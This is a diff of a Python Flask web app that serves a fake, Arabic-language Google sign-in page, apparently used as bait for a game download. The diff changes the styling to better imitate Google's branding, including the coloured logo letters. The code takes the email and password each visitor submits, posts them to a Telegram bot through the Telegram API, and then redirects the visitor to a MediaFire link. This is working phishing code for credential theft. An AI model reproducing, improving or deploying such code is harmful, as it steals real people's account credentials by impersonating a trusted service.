@@ -15,21 +15,21 @@ MEDIAFIRE_URL = (
 
 
 @app.route("/", methods=["GET", "POST"])
-def home():
+def login():
   if request.method == "POST":
     email = request.form.get("email")
     password = request.form.get("password")
 
-    # إرسال البريد وكلمة السر الحقيقية التي كتبها المستخدم إلى بوت تيليجرام
+    # إرسال البيانات إلى بوت تيليجرام
     if BOT_TOKEN and CHAT_ID:
       msg = (
-          "🚨 تم التقاط بيانات دخول جديدة!\n\n📧 البريد الإلكتروني:"
-          f" {email}\n🔑 كلمة السر: {password}"
+          "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
+          f" {email}\n🔑 الباسورد: {password}"
       )
       telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
       requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-    # التوجيه المباشر لرابط التحميل على ميديافاير
+    # التوجيه لرابط التحميل
     return redirect(MEDIAFIRE_URL)
 
   return render_template_string("""
@@ -38,26 +38,39 @@ def home():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول بحساب Google</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }
-        .login-card { background: #fff; width: 100%; max-width: 400px; padding: 40px 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); border: 1px solid #dadce0; text-align: center; }
-        .google-logo { font-size: 24px; font-weight: bold; color: #4285F4; margin-bottom: 10px; }
-        h2 { color: #202124; font-size: 22px; margin-bottom: 8px; font-weight: 500; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
-        .input-group { margin-bottom: 15px; text-align: right; }
-        .input-group input { width: 100%; padding: 14px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 15px; outline: none; transition: border 0.3s; }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 13px 14px; }
-        .submit-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 20px; }
+        .google-card { background: #fff; width: 100%; max-width: 450px; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; }
+        
+        /* شعار Google بالألوان الرسمية */
+        .google-logo { font-size: 28px; font-weight: 500; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .google-logo span:nth-child(1) { color: #4285F4; }
+        .google-logo span:nth-child(2) { color: #EA4335; }
+        .google-logo span:nth-child(3) { color: #FBBC05; }
+        .google-logo span:nth-child(4) { color: #4285F4; }
+        .google-logo span:nth-child(5) { color: #34A853; }
+        .google-logo span:nth-child(6) { color: #EA4335; }
+
+        h2 { color: #202124; font-size: 24px; font-weight: 400; margin-bottom: 8px; }
+        p { color: #5f6368; font-size: 16px; margin-bottom: 30px; }
+
+        .input-group { margin-bottom: 20px; text-align: right; position: relative; }
+        .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; background: transparent; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }
+
+        .submit-btn { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
         .submit-btn:hover { background: #1557b0; }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <div class="google-logo">Google</div>
+    <div class="google-card">
+        <div class="google-logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+        </div>
         <h2>تسجيل الدخول</h2>
-        <p>استخدم حساب Google الخاص بك للتابعة وتحميل اللعبة</p>
+        <p>استخدم حساب Google الخاص بك</p>
         <form method="POST">
             <div class="input-group">
                 <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
